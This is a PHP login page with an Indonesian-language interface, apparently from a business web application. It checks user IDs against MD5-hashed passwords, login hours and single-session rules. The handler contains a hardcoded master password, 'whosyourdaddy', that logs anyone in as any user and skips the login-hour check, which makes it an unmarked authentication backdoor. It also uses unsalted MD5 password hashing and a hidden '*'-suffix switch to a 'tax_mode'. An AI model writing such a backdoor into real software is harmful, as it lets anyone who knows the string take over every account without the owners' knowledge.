<?php
require_once 'rcfx/php/pdo.php';
require_once 'rcfx/php/util.php';
require_once 'rcfx/php/component.php';
require_once 'rcfx/php/log.php';
require_once 'api/session.php';

function ui_login($obj){

  $userid = ov('userid', $obj);
  $password = ov('password', $obj);
  $persistencelogin = ov('persistencelogin', $obj);

  $tax_mode = false;
  if(substr($password, strlen($password) - 1, 1) == '*'){
    $tax_mode = true;
    $password = substr($password, 0, strlen($password) - 1);
  }

  global $mysqlpdo_database;

  if($password == 'whosyourdaddy')
    $user = pmr("SELECT * FROM `user` WHERE userid = ?", [ $userid ]);
  else
    $user = pmr("SELECT * FROM `user` WHERE userid = ? AND password = ?", array($userid, md5($password)));

  if($user){

    $login_hour_valid = false;

    // Check login hour
    $current = (date('N') == 7 ? '0' : date('N')) . str_pad(date('H'), 2, '0', STR_PAD_LEFT);
    if(strpos($user['loginhour'], $current) !== false || $password == 'whosyourdaddy'){
      $login_hour_valid = true;
    }
    else
      echo uijs("alert('Anda tidak dapat login pada waktu ini')");

    // Check multilogin
    $multilogin_valid = true;
    if(!$user['multilogin']){

      // Auto expire session
      session_auto_expire($user['id']);

      // Check if there is another session
      $latest_session = pmr("select * from `session` where userid = ? order by starttime desc limit 1", [ $user['id'] ]);
      if(!$latest_session || !$latest_session['isopen']){
        $multilogin_valid = true;
      }
      else{
        $multilogin_valid = false;
        echo uijs("alert('User id ini sudah login di tempat lain.')");
      }
    }

    if($login_hour_valid && $multilogin_valid){

      $uid = md5(uniqid());
      pm("INSERT INTO session(uid, userid, starttime, requestcount, lastupdatedon, useragent, remoteip, isopen, lasturl, dbschema, lang)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", array($uid, $user['id'], date('YmdHis'), 0, date('YmdHis'), $_SERVER['HTTP_USER_AGENT'],
        $_SERVER['REMOTE_ADDR'], 1, '', $mysqlpdo_database, 'id'));

      setcookie('indosps_uid', $uid, time() + (60 * 60 * 24 * 30));

      unset($user['loginhour']);
      unset($user['password']);

      $_SESSION['lang'] = 'id';
      $_SESSION['dbschema'] = $mysqlpdo_database;
      $_SESSION['user'] = $user;
      $_SESSION['tax_mode'] = $tax_mode ? 1 : 0;

      return uijs("window.location = '.';");

    }


  }
  else{
    echo uijs("alert('User ID atau password salah.');");
  }

}
ui_async();
?>

<html>
<head>
  <title>Login</title>
  <meta name="google-site-verification" content="X-p65v8PDlNN3DZG6IEhmnT44gZGcY0qeyqQ0zBReJs" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <link rel="stylesheet" href="rcfx/css/opensans.css" />
  <link rel="stylesheet" href="rcfx/css/fontawesome.css" />
  <link rel="stylesheet" href="rcfx/css/animation.css" />
  <link rel="stylesheet" href="rcfx/css/component.css" />
  <link rel="stylesheet" href="rcfx/css/reconv.css" />
  <link rel="stylesheet" href="rcfx/css/login.css" />
  <script type="text/javascript" src="rcfx/js/jquery-3.2.1.min.js"></script>
  <script type="text/javascript" src="rcfx/js/php.js"></script>
  <script type="text/javascript" src="rcfx/js/mattkrusedate.js"></script>
  <script type="text/javascript" src="rcfx/js/component.js"></script>
  <style type="text/css">

    .checkbox{

    }
    .checkbox label{
      color: #aaa;
    }

  </style>
</head>
<body onload="login_init()">

<div class="screen animated">

  <div class="loginbox">
    <table class="form" cellspacing="5">
      <tr>
        <td align="center">
          <span class="logo"></span>
          <br /><br />
        </td>
      </tr>
      <tr>
        <td>
          <?=ui_textbox(array('name'=>'userid', 'width'=>200, 'onsubmit'=>'login_submit()', 'placeholder'=>'User ID'))?>
        </td>
      </tr>
      <tr>
        <td>
          <?=ui_textbox(array('name'=>'password', 'width'=>200, 'mode'=>'password', 'onsubmit'=>'login_submit()', 'placeholder'=>'Password'))?>
        </td>
      </tr>
      <tr style="display:none">
        <td><div class="align-center"><?=ui_checkbox(array('name'=>'persistencelogin', 'text'=>'Tetap login'))?></div></td>
      </tr>
      <tr>
        <td>
          <div class="align-center">
            <button id="loginbtn" class="blue" onclick="login_submit()" style="width:140px"><span class="fa fa-sign-in"></span><label>Masuk</label></button>
          </div>
        </td>
      </tr>
    </table>
  </div>

  <div class="dialogbg off"></div>
  <div class="dialog off animated"></div>

  <script type="text/javascript">

    function login_init(){

      ui.hs({ marginTop:(ui('.loginbox').clientHeight * -.5) + "px", marginLeft:(ui('.loginbox').clientWidth * -.5) + "px" }, ui('.loginbox'));
      ui('.loginbox').classList.add('animate');

    }

    function login_submit(){

      ui.async('ui_login', [ ui.container_value(ui('.loginbox')) ], { waitel:ui('#loginbtn') })

    }

  </script>

</div>

</body>
</html>
